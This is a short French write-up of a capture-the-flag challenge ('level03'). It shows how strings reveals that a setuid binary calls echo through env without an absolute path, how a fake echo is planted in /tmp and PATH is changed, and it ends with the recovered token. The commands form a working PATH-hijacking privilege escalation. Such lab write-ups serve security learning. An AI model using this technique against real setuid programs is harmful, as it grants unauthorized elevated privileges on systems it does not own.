## Étape 1:

On a accès à un executable:
```
./level03 
Exploit me
```

En l'analysant avec strings on voit ceci:
```
...
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
...
```

Setresgid est une fonction qui permet d'augmenter les droits du programme par rapport au mien et le programme execute ```/usr/bin/env echo Exploit me``` sans donner de path absolu à echo.

## Étape 2:

On crée un nouveau programme echo et on change le PATH dans l'env pour que le programme execute notre echo, ce qu nous permet de recupérer le flag:
```
echo "/bin/sh -c 'getflag'" > /tmp/echo
chmod 755 /tmp/echo
export PATH=/tmp:$PATH
./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```